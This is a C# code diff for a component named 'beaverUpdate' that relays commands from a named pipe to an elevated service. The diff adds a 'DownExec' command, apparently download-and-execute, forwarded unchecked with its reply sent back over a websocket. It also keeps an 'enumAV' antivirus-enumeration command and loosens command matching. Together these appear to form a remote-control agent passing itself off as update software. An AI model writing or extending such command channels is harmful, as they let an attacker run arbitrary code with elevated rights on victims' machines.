@@ -9,6 +9,7 @@ using Newtonsoft.Json;
 using System.Collections.Concurrent;
 using System.IO.Pipes;
 using System.IO;
+using System.Diagnostics;
 
 namespace beaverUpdate
 {
@@ -61,23 +62,27 @@ namespace beaverUpdate
                                 string receivedText = await reader.ReadToEndAsync();
 
                                 // Handle different types of messages
-                                if (receivedText.StartsWith("syncregister"))
+                                if (receivedText.Contains("syncregister"))
                                 {
-                                    Console.WriteLine($"Received command1: {receivedText}");
+                                    Console.WriteLine($"Received: {receivedText}");
                                     // Execute async task for command1
                                     await Task.Run(() => SyncRegister());
                                 }
-                                else if (receivedText.StartsWith("syncunregister"))
+                                else if (receivedText.Contains("syncunregister"))
                                 {
-                                    Console.WriteLine($"Received command2: {receivedText}");
+                                    Console.WriteLine($"Received: {receivedText}");
                                     // Execute async task for command2
                                     await Task.Run(() => SyncUnregister());
                                 } // ALL TASKS BELOW ARE RUN BY BEAVER ELEVATE SERVICE THROUGH NAMED PIPE
-                                else if (receivedText.StartsWith("enumAV"))
+                                else if (receivedText.Contains("enumAV"))
                                 {
-                                    Console.WriteLine($"Received command3: {receivedText}");
+                                    Console.WriteLine($"Received: {receivedText}");
                                     // Execute async task for command3
                                     await Task.Run(() => SendRequest("enumAV"));
+                                }
+                                else if (receivedText.Contains("DownExec")) {
+                                    Console.WriteLine($"Received: {receivedText}");
+                                    await Task.Run(() => SendRequest(receivedText));
                                 }
                                 else
                                 {
@@ -109,18 +114,38 @@ namespace beaverUpdate
         {
             // Run BeaverSync /register currentuser
             Console.WriteLine($"Executing SyncRegister()");
+            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            string BeaverSync = "BeaverSync.exe";
+            ProcessStartInfo startBUR = new ProcessStartInfo
+            {
+                FileName = Path.Combine(currentDirectory, BeaverSync),
+                Arguments = "/register",
+                UseShellExecute = true
+            };
+            try
+            {
+                Process.Start(startBUR);
+            }
+            catch { }
         }
 
         private static void SyncUnregister()
         {
             // Run BeaverSync /unregister
             Console.WriteLine($"Executing SyncUnregister()");
-        }
-
-        private static void ExecuteCommand3(string message)
-        {
-            // Implementation for command3
-            Console.WriteLine($"Executing command3 with: {message}");
+            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            string BeaverSync = "BeaverSync.exe";
+            ProcessStartInfo startBUU = new ProcessStartInfo
+            {
+                FileName = Path.Combine(currentDirectory, BeaverSync),
+                Arguments = "/unregister",
+                UseShellExecute = true
+            };
+            try
+            {
+                Process.Start(startBUU);
+            }
+            catch { }
         }
 
         private static async Task SendRequest(string command)
@@ -136,6 +161,14 @@ namespace beaverUpdate
                 {
                     await writer.WriteAsync(command); // Use WriteAsync for asynchronous writing
                     await writer.FlushAsync(); // Ensure the data is written
+                }
+
+                using (StreamReader reader = new StreamReader(pipeClient))
+                {
+                    string response = await reader.ReadLineAsync(); // Use ReadLineAsync for asynchronous reading
+                    Console.WriteLine(response);
+                    // send it back down the websocket
+                    EnqueueMessage(response);
                 }
             }
         }
